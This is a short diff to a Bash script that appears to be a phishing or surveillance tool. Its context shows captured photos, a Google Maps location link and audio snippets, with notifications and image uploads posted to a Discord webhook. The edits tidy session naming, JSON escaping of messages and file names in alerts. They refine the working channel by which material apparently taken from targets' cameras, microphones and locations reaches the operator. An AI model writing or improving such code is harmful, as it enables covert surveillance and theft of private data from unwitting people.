@@ -131,7 +131,7 @@ Google Maps: $maps_link"
 # Session management
 # ─────────────────────────────────────────────
 create_session() {
-session_dir="sessions/$(date +%Y%m%d_%H%M%S)"
+session_dir="sessions/$(date +%Y%m%d_%H%M%S)_$$"
 mkdir -p "$session_dir"
 echo "$session_dir" > session_dir.txt
 printf "\e[1;92m[\e[0m+\e[1;92m] Session directory:\e[0m\e[1;77m %s\e[0m\n" "$session_dir"
@@ -245,10 +245,11 @@ elif [[ "$notif_type" == "discord" ]]; then
       -F "file=@${photo_file}" > /dev/null 2>&1 &
   else
     local escaped
-    escaped=$(printf '%s' "$message" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null || printf '"%s"' "$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g')")
+    # Escape for JSON string value: backslash, double-quote, then common control chars
+    escaped=$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g; s/	/\\t/g' | awk '{printf "%s\\n", $0}' | head -c -2)
     curl -s -X POST "${discord_webhook}" \
       -H "Content-Type: application/json" \
-      -d "{\"content\": ${escaped}}" > /dev/null 2>&1 &
+      -d "{\"content\": \"${escaped}\"}" > /dev/null 2>&1 &
   fi
 fi
 }
@@ -314,7 +315,7 @@ latest_audio=$(ls -t "$session_dir"/audio*.webm 2>/dev/null | head -n 1)
 if [[ -n "$latest_audio" ]]; then
   printf "\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m %s\e[0m\n" "$latest_audio"
 fi
-send_notification "🎙️ Audio snippet captured: $latest_audio"
+send_notification "🎙️ Audio snippet captured: $(basename "$latest_audio")"
 rm -rf "$session_dir/AudioLog.log"
 fi
 
